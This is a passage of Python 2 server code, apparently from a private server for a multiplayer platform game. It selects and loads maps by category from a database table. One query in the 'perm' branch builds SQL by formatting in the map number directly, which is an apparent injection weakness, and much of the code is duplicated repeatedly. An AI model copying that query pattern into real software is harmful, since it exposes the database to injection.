                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
            elif perm:
                maplist = []
                self.Database.execute('select code from mapeditor where perma = {p}'.format(p=mapnum))
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                if len(maplist) >= 1:
                    runthismap = random.choice(maplist)
                else:
                    runthismap = ''
                if runthismap == '':
                    self.ISCM = -1
                    return 0
                else:
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
            else:
                if xmlmap:
                    mapcode = int(0)
                    mapname = '_Minigame'
                    mapxml = mapnum
                    yesvotes = 0
                    novotes = 0
                    perma = 2
                    mapnoexist = 0
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
                self.ISCM = -1
                self.ISCMdata = [0,
                 'Invalid',
                 '<C><P /><Z><S /><D /><O /></Z></C>',
                 0,
                 0,
                 0,
                 0,
                 0]
                runthismap = random.choice(LEVEL_LIST)
                return runthismap
            return
            return

    def selectMapSpecial(self, mapnum):
        if int(mapnum) in self.server.SPMmaps:
            for spm in self.server.SPM:
                if spm[0] == int(mapnum):
                    mapcode = 1
                    mapname = spm[1]
                    mapxml = spm[2]
                    yesvotes = 0
                    novotes = 0
                    perma = 2
                    mapnoexist = 1
                    level = 0
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist,
                     level]
                    return '-1'

        else:
            print 'fail?'

    def selectMap(self, NewRoom = None):
        if self.PTwoCycle:
            if self.PTwoCycleList == []:
                self.Database.execute('select * from mapeditor where perma = 2')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    self.PTwoCycle = False
                else:
                    for rrf in rrfRows:
                        self.PTwoCycleList.append(rrf[1])

                mapnum = self.PTwoCycleList[self.PTwoCycleInfo]
                self.PTwoCycleInfo += 1
                if self.PTwoCycleInfo == len(self.PTwoCycleList):
                    self.PTwoCycle = False
                    self.PTwoCycleInfo = 0
                    self.PTwoCycleList = []
                    if self.sPTCTimer:
                        try:
                            self.sPTCTimer.cancel()
                        except:
                            self.sPTCTimer = None

                mapcode = int(mapnum)
                mapname = self.server.getMapName(mapcode)
                mapxml = self.server.getMapXML(mapcode)
                yesvotes = int(self.server.getMapYesVotes(mapcode))
                novotes = int(self.server.getMapNoVotes(mapcode))
                perma = int(self.server.getMapPerma(mapcode))
                mapnoexist = int(self.server.getMapDel(mapcode))
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
            else:
                mapnum = self.PTwoCycleList[self.PTwoCycleInfo]
                self.PTwoCycleInfo += 1
                if self.PTwoCycleInfo == len(self.PTwoCycleList):
                    self.PTwoCycle = False
                    self.PTwoCycleInfo = 0
                    self.PTwoCycleList = []
                    if self.sPTCTimer:
                        try:
                            self.sPTCTimer.cancel()
                        except:
                            self.sPTCTimer = None

                mapcode = int(mapnum)
                mapname = self.server.getMapName(mapcode)
                mapxml = self.server.getMapXML(mapcode)
                yesvotes = int(self.server.getMapYesVotes(mapcode))
                novotes = int(self.server.getMapNoVotes(mapcode))
                perma = int(self.server.getMapPerma(mapcode))
                mapnoexist = int(self.server.getMapDel(mapcode))
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
        if self.NoNumberedMaps:
            self.ISCMstatus = 3
        if self.forceNextMap:
            forceNextMap = self.forceNextMap
            self.forceNextMap = False
            if forceNextMap.startswith('@'):
                forceNextMap = forceNextMap.replace('@', '')
                return self.selectMapSpecific(forceNextMap, custom=True)
            else:
                return self.selectMapSpecific(forceNextMap, vanilla=True)
        elif NewRoom:
            if self.isBootcamp:
                maplist = []
                self.Database.execute('select code from mapeditor where perma = 3')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 13')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                if len(maplist) >= 1:
                    runthismap = random.choice(maplist)
                else:
                    runthismap = ''
                if len(maplist) >= 2:
                    while runthismap == self.ISCM:
                        runthismap = random.choice(maplist)

                if runthismap == '':
                    self.ISCM = -1
                    return 0
                else:
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
            elif self.isRacing:
                maplist = []
                self.Database.execute('select code from mapeditor where perma = 7')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 17')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                if len(maplist) >= 1:
                    runthismap = random.choice(maplist)
                else:
                    runthismap = ''
                if len(maplist) >= 2:
                    while runthismap == self.ISCM:
                        runthismap = random.choice(maplist)

                if runthismap == '':
                    self.ISCM = -1
                    return 0
                else:
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
            elif self.isSurvivor:
                maplist = []
                self.Database.execute('select code from mapeditor where perma = 10')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 10')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 10')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 10')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 10')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 10')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 10')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                self.Database.execute('select code from mapeditor where perma = 11')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                if len(maplist) >= 1:
                    runthismap = random.choice(maplist)
                else:
                    runthismap = ''
                if len(maplist) >= 2:
                    while runthismap == self.ISCM:
                        runthismap = random.choice(maplist)

                if runthismap == '':
                    self.ISCM = -1
                    return 0
                else:
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
            elif self.isDefilante:
                maplist = []
                self.Database.execute('select code from mapeditor where perma = 18')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                if len(maplist) >= 1:
                    runthismap = random.choice(maplist)
                else:
                    runthismap = ''
                if runthismap == '':
                    self.ISCM = -1
                    return 0
                else:
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
            elif self.isMusic:
                maplist = []
                self.Database.execute('select code from mapeditor where perma = 19')
                rrfRows = self.Database.fetchall()
                if rrfRows is None:
                    pass
                else:
                    for rrf in rrfRows:
                        maplist.append(rrf[0])

                if len(maplist) >= 1:
                    runthismap = random.choice(maplist)
                else:
                    runthismap = ''
                if runthismap == '':
                    self.ISCM = -1
                    return 0
                else:
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
            elif self.isPlazza:
                mapname = '_Plazza'
                mapcode = 801
                loadmap = open('./Data/atelier/801.xml', 'r')
                mapxml = loadmap.read()
                loadmap.close()
                yesvotes = 0
                novotes = 0
                mapnoexist = 0
                perma = 1
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
            else:
                if self.isTribehouse:
                    tribename = self.name[2:]
                    code = self.server.getTribeCode(tribename)
                    TribeData = self.server.getTribeData(int(code[0]))
                    runthismap = TribeData[5]
                    mapcode = int(runthismap)
                    if mapcode == 0:
                        mapname = 'Tigrounette'
                        mapcode = 1
                        loadmap = open('./Data/tribe/0.xml', 'r')
                        mapxml = loadmap.read()
                        loadmap.close()
                        yesvotes = 0
                        novotes = 0
                        mapnoexist = 0
                        perma = 22
                    else:
                        mapname = self.server.getMapName(mapcode)
                        mapxml = self.server.getMapXML(mapcode)
                        yesvotes = int(self.server.getMapYesVotes(mapcode))
                        novotes = int(self.server.getMapNoVotes(mapcode))
                        perma = int(self.server.getMapPerma(mapcode))
                        mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    self.tribehouseCM = mapcode
                    self.tribehouseCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    self.isTribehouseMap = True
                    return '-1'
                if self.isEditeur:
                    return 0
                if self.SPR_Room and self.SPR_CM != 0:
                    runthismap = self.SPR_CM
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
                if self.specialMap != 0:
                    return self.selectMapSpecial(self.specialMap)
                self.ISCM = -1
                self.ISCMdata = [0,
                 'Inv\xc3\xa1lido',
                 '<C><P /><Z><S /><D /><O /></Z></C>',
                 0,
                 0,
                 0,
                 0,
                 0]
                runthismap = random.choice(LEVEL_LIST)
                if self.specificMap:
                    runthismap = self.currentWorld
                return runthismap

        elif self.isBootcamp:
            maplist = []
            self.Database.execute('select code from mapeditor where perma = 3')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 13')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            if len(maplist) >= 1:
                runthismap = random.choice(maplist)
            else:
                runthismap = ''
            if len(maplist) >= 2:
                while runthismap == self.ISCM:
                    runthismap = random.choice(maplist)

            if runthismap == '':
                self.ISCM = -1
                return 0
            else:
                mapcode = int(runthismap)
                mapname = self.server.getMapName(mapcode)
                mapxml = self.server.getMapXML(mapcode)
                yesvotes = int(self.server.getMapYesVotes(mapcode))
                novotes = int(self.server.getMapNoVotes(mapcode))
                perma = int(self.server.getMapPerma(mapcode))
                mapnoexist = int(self.server.getMapDel(mapcode))
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
        elif self.isSurvivor:
            maplist = []
            self.Database.execute('select code from mapeditor where perma = 10')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 10')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 10')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 10')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 10')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 10')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 10')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 11')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            if len(maplist) >= 1:
                runthismap = random.choice(maplist)
            else:
                runthismap = ''
            if len(maplist) >= 2:
                while runthismap == self.ISCM:
                    runthismap = random.choice(maplist)

            if runthismap == '':
                self.ISCM = -1
                return 0
            else:
                mapcode = int(runthismap)
                mapname = self.server.getMapName(mapcode)
                mapxml = self.server.getMapXML(mapcode)
                yesvotes = int(self.server.getMapYesVotes(mapcode))
                novotes = int(self.server.getMapNoVotes(mapcode))
                perma = int(self.server.getMapPerma(mapcode))
                mapnoexist = int(self.server.getMapDel(mapcode))
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
        elif self.isRacing:
            maplist = []
            self.Database.execute('select code from mapeditor where perma = 7')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            self.Database.execute('select code from mapeditor where perma = 17')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            if len(maplist) >= 1:
                runthismap = random.choice(maplist)
            else:
                runthismap = ''
            if len(maplist) >= 2:
                while runthismap == self.ISCM:
                    runthismap = random.choice(maplist)

            if runthismap == '':
                runthismap = random.choice(LEVEL_LIST)
                while runthismap == self.currentWorld:
                    runthismap = random.choice(LEVEL_LIST)

                if self.specificMap:
                    runthismap = self.currentWorld
                return runthismap
            else:
                mapcode = int(runthismap)
                mapname = self.server.getMapName(mapcode)
                mapxml = self.server.getMapXML(mapcode)
                yesvotes = int(self.server.getMapYesVotes(mapcode))
                novotes = int(self.server.getMapNoVotes(mapcode))
                perma = int(self.server.getMapPerma(mapcode))
                mapnoexist = int(self.server.getMapDel(mapcode))
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
        elif self.isDefilante:
            maplist = []
            self.Database.execute('select code from mapeditor where perma = 18')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            if len(maplist) >= 1:
                runthismap = random.choice(maplist)
            else:
                runthismap = ''
            if runthismap == '':
                self.ISCM = -1
                return 0
            else:
                mapcode = int(runthismap)
                mapname = self.server.getMapName(mapcode)
                mapxml = self.server.getMapXML(mapcode)
                yesvotes = int(self.server.getMapYesVotes(mapcode))
                novotes = int(self.server.getMapNoVotes(mapcode))
                perma = int(self.server.getMapPerma(mapcode))
                mapnoexist = int(self.server.getMapDel(mapcode))
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
        elif self.isMusic:
            maplist = []
            self.Database.execute('select code from mapeditor where perma = 19')
            rrfRows = self.Database.fetchall()
            if rrfRows is None:
                pass
            else:
                for rrf in rrfRows:
                    maplist.append(rrf[0])

            if len(maplist) >= 1:
                runthismap = random.choice(maplist)
            else:
                runthismap = ''
            if runthismap == '':
                self.ISCM = -1
                return 0
            else:
                mapcode = int(runthismap)
                mapname = self.server.getMapName(mapcode)
                mapxml = self.server.getMapXML(mapcode)
                yesvotes = int(self.server.getMapYesVotes(mapcode))
                novotes = int(self.server.getMapNoVotes(mapcode))
                perma = int(self.server.getMapPerma(mapcode))
                mapnoexist = int(self.server.getMapDel(mapcode))
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
        else:
            if self.isTribehouse:
                self.ISCM = 0
                self.ISCMdata = [0,
                 'Inv\xc3\xa1lido',
                 '<C><P /><Z><S /><D /><O /></Z></C>',
                 0,
                 0,
                 0,
                 0,
                 0]
                return '-1'
            if self.isPlazza:
                mapname = '_Plazza'
                mapcode = 801
                loadmap = open('./addons/atelier/801.xml', 'r')
                mapxml = loadmap.read()
                loadmap.close()
                yesvotes = 0
                novotes = 0
                mapnoexist = 0
                perma = 1
                self.ISCM = mapcode
                self.ISCMdata = [mapcode,
                 mapname,
                 mapxml,
                 yesvotes,
                 novotes,
                 perma,
                 mapnoexist]
                return '-1'
            if self.isEditeur:
                if self.ISCMV != 0:
                    return self.ISCMV
                else:
                    return 0
            else:
                if self.SPR_Room and self.SPR_CM != 0:
                    runthismap = self.SPR_CM
                    mapcode = int(runthismap)
                    mapname = self.server.getMapName(mapcode)
                    mapxml = self.server.getMapXML(mapcode)
                    yesvotes = int(self.server.getMapYesVotes(mapcode))
                    novotes = int(self.server.getMapNoVotes(mapcode))
                    perma = int(self.server.getMapPerma(mapcode))
                    mapnoexist = int(self.server.getMapDel(mapcode))
                    self.ISCM = mapcode
                    self.ISCMdata = [mapcode,
                     mapname,
                     mapxml,
                     yesvotes,
                     novotes,
                     perma,
                     mapnoexist]
                    return '-1'
                if self.specialMap != 0:
                    return self.selectMapSpecial(self.specialMap)
                self.ISCM = -1
                self.ISCMdata = [0,
                 'Inv\xc3\xa1lido',
                 '<C><P /><Z><S /><D /><O /></Z></C>',
                 0,
                 0,
                 0,
                 0,
                 0]
                if self.isVanilla:
                    runthismap = random.choice(LEVEL_LIST)
                    while runthismap == self.currentWorld:
                        runthismap = random.choice(LEVEL_LIST)

                    if self.specificMap:
                        runthismap = self.currentWorld
                    return runthismap
                if self.ISCMstatus == 0:
                    runthismap = random.choice(LEVEL_LIST)
                    while runthismap == self.currentWorld:
                        runthismap = random.choice(LEVEL_LIST)

                    if self.specificMap:
                        runthismap = self.currentWorld
                    return runthismap
                if self.ISCMstatus == 1:
                    maplist = []
                    self.Database.execute('select code from mapeditor where perma = 0')
                    rrfRows = self.Database.fetchall()
                    if rrfRows is None:
                        pass
                    else:
                        for rrf in rrfRows:
                            maplist.append(rrf[0])

                    self.Database.execute('select code from mapeditor where perma = 1')
                    rrfRows = self.Database.fetchall()
                    if rrfRows is None:
                        pass
                    else:
                        for rrf in rrfRows:
                            maplist.append(rrf[0])

                    if len(maplist) >= 1:
                        runthismap = random.choice(maplist)
                    else:
                        runthismap = ''
                    if len(maplist) >= 2:
                        while runthismap == self.ISCM:
                            runthismap = random.choice(maplist)

                    if runthismap == '':
                        runthismap = random.choice(LEVEL_LIST)
                        while runthismap == self.currentWorld:
                            runthismap = random.choice(LEVEL_LIST)

                        if self.specificMap:
                            runthismap = self.currentWorld
                        return runthismap
                    else:
                        mapcode = int(runthismap)
                        mapname = self.server.getMapName(mapcode)
                        mapxml = self.server.getMapXML(mapcode)
                        yesvotes = int(self.server.getMapYesVotes(mapcode))
                        novotes = int(self.server.getMapNoVotes(mapcode))
                        perma = int(self.server.getMapPerma(mapcode))
                        mapnoexist = int(self.server.getMapDel(mapcode))
                        self.ISCM = mapcode
                        self.ISCMdata = [mapcode,
                         mapname,
                         mapxml,
                         yesvotes,
                         novotes,
                         perma,
                         mapnoexist]
                        return '-1'
                elif self.ISCMstatus == 2:
                    maplist = []
                    self.Database.execute('select code from mapeditor where perma = 5')
                    rrfRows = self.Database.fetchall()
                    if rrfRows is None:
                        pass
                    else:
                        for rrf in rrfRows:
                            maplist.append(rrf[0])

                    if len(maplist) >= 1:
                        runthismap = random.choice(maplist)
                    else:
                        runthismap = ''
                    if len(maplist) >= 2:
                        while runthismap == self.ISCM:
                            runthismap = random.choice(maplist)

                    if runthismap == '':
                        runthismap = random.choice(LEVEL_LIST)
                        while runthismap == self.currentWorld:
                            runthismap = random.choice(LEVEL_LIST)

                        if self.specificMap:
                            runthismap = self.currentWorld
                        return runthismap
                    else:
                        mapcode = int(runthismap)
                        mapname = self.server.getMapName(mapcode)
                        mapxml = self.server.getMapXML(mapcode)
                        yesvotes = int(self.server.getMapYesVotes(mapcode))
                        novotes = int(self.server.getMapNoVotes(mapcode))
                        perma = int(self.server.getMapPerma(mapcode))
                        mapnoexist = int(self.server.getMapDel(mapcode))
                        self.ISCM = mapcode
                        self.ISCMdata = [mapcode,
                         mapname,
                         mapxml,
                         yesvotes,
                         novotes,
                         perma,
                         mapnoexist]
                        return '-1'
                elif self.ISCMstatus == 3:
                    maplist = []
                    self.Database.execute('select code from mapeditor where perma = 9')
                    rrfRows = self.Database.fetchall()
                    if rrfRows is None:
                        pass
                    else:
                        for rrf in rrfRows:
                            maplist.append(rrf[0])

                    if len(maplist) >= 1:
                        runthismap = random.choice(maplist)
                    else:
                        runthismap = ''
                    if len(maplist) >= 2:
                        while runthismap == self.ISCM:
                            runthismap = random.choice(maplist)

                    if runthismap == '':
                        runthismap = random.choice(LEVEL_LIST)
                        while runthismap == self.currentWorld:
                            runthismap = random.choice(LEVEL_LIST)

                        if self.specificMap:
                            runthismap = self.currentWorld
                        return runthismap
                    else:
                        mapcode = int(runthismap)
                        mapname = self.server.getMapName(mapcode)
                        mapxml = self.server.getMapXML(mapcode)
                        yesvotes = int(self.server.getMapYesVotes(mapcode))
                        novotes = int(self.server.getMapNoVotes(mapcode))
                        perma = int(self.server.getMapPerma(mapcode))
                        mapnoexist = int(self.server.getMapDel(mapcode))
                        self.ISCM = mapcode
                        self.ISCMdata = [mapcode,
                         mapname,
                         mapxml,
                         yesvotes,
                         novotes,
                         perma,
                         mapnoexist]
                        return '-1'
                else:
                    if self.ISCMstatus == 4:
                        runthismap = random.choice(LEVEL_LIST)
                        while runthismap == self.currentWorld:
                            runthismap = random.choice(LEVEL_LIST)

                        if self.specificMap:
                            runthismap = self.currentWorld
                        return runthismap
                    if self.ISCMstatus == 5:
                        maplist = []
                        self.Database.execute('select code from mapeditor where perma = 6')
                        rrfRows = self.Database.fetchall()
                        if rrfRows is None:
                            pass
                        else:
                            for rrf in rrfRows:
                                maplist.append(rrf[0])

                        if len(maplist) >= 1:
                            runthismap = random.choice(maplist)
                        else:
                            runthismap = ''
                        if len(maplist) >= 2:
                            while runthismap == self.ISCM:
                                runthismap = random.choice(maplist)

                        if runthismap == '':
                            runthismap = random.choice(LEVEL_LIST)
                            while runthismap == self.currentWorld:
                                runthismap = random.choice(LEVEL_LIST)

                            if self.specificMap:
                                runthismap = self.currentWorld
                            return runthismap
                        else:
                            mapcode = int(runthismap)
                            mapname = self.server.getMapName(mapcode)
                            mapxml = self.server.getMapXML(mapcode)
                            yesvotes = int(self.server.getMapYesVotes(mapcode))
                            novotes = int(self.server.getMapNoVotes(mapcode))
                            perma = int(self.server.getMapPerma(mapcode))
                            mapnoexist = int(self.server.getMapDel(mapcode))
                            self.ISCM = mapcode
                            self.ISCMdata = [mapcode,
                             mapname,
                             mapxml,
                             yesvotes,
                             novotes,
                             perma,
                             mapnoexist]
                            return '-1'
                    elif self.ISCMstatus == 6:
                        maplist = []
                        self.Database.execute('select code from mapeditor where perma = 7')
                        rrfRows = self.Database.fetchall()
                        if rrfRows is None:
                            pass
                        else:
                            for rrf in rrfRows:
                                maplist.append(rrf[0])

                        if len(maplist) >= 1:
                            runthismap = random.choice(maplist)
                        else:
                            runthismap = ''
                        if len(maplist) >= 2:
                            while runthismap == self.ISCM:
                                runthismap = random.choice(maplist)

                        if runthismap == '':
                            runthismap = random.choice(LEVEL_LIST)
                            while runthismap == self.currentWorld:
                                runthismap = random.choice(LEVEL_LIST)

                            if self.specificMap:
                                runthismap = self.currentWorld
                            return runthismap
                        else:
                            mapcode = int(runthismap)
                            mapname = self.server.getMapName(mapcode)
                            mapxml = self.server.getMapXML(mapcode)
                            yesvotes = int(self.server.getMapYesVotes(mapcode))
                            novotes = int(self.server.getMapNoVotes(mapcode))
                            perma = int(self.server.getMapPerma(mapcode))
                            mapnoexist = int(self.server.getMapDel(mapcode))
                            self.ISCM = mapcode
                            self.ISCMdata = [mapcode,
                             mapname,
                             mapxml,
                             yesvotes,
                             novotes,
                             perma,
                             mapnoexist]
                            return '-1'
                    elif self.ISCMstatus == 7:
                        maplist = []
                        self.Database.execute('select code from mapeditor where perma = 8')
                        rrfRows = self.Database.fetchall()
                        if rrfRows is None:
                            pass
                        else:
                            for rrf in rrfRows:
                                maplist.append(rrf[0])

                        if len(maplist) >= 1:
                            runthismap = random.choice(maplist)
                        else:
                            runthismap = ''
                        if len(maplist) >= 2:
                            while runthismap == self.ISCM:
                                runthismap = random.choice(maplist)

                        if runthismap == '':
                            runthismap = random.choice(LEVEL_LIST)
                            while runthismap == self.currentWorld:
                                runthismap = random.choice(LEVEL_LIST)

                            if self.specificMap:
                                runthismap = self.currentWorld
                            return runthismap
                        else:
                            mapcode = int(runthismap)
                            mapname = self.server.getMapName(mapcode)
                            mapxml = self.server.getMapXML(mapcode)
                            yesvotes = int(self.server.getMapYesVotes(mapcode))
                            novotes = int(self.server.getMapNoVotes(mapcode))
                            perma = int(self.server.getMapPerma(mapcode))
                            mapnoexist = int(self.server.getMapDel(mapcode))
                            self.ISCM = mapcode
                            self.ISCMdata = [mapcode,
                             mapname,
                             mapxml,
                             yesvotes,
                             novotes,
                             perma,
                             mapnoexist]
                            return '-1'
                    else:
                        if self.ISCMstatus == 8:
                            runthismap = random.choice(LEVEL_LIST)
                            while runthismap == self.currentWorld:
                                runthismap = random.choice(LEVEL_LIST)

                            if self.specificMap:
                                runthismap = self.currentWorld
                            return runthismap
                        if self.ISCMstatus == 9:
                            maplist = []
                            self.Database.execute('select code from mapeditor where perma = 0')
                            rrfRows = self.Database.fetchall()
                            if rrfRows is None:
                                pass
                            else:
                                for rrf in rrfRows:
                                    maplist.append(rrf[0])

                            self.Database.execute('select code from mapeditor where perma = 1')
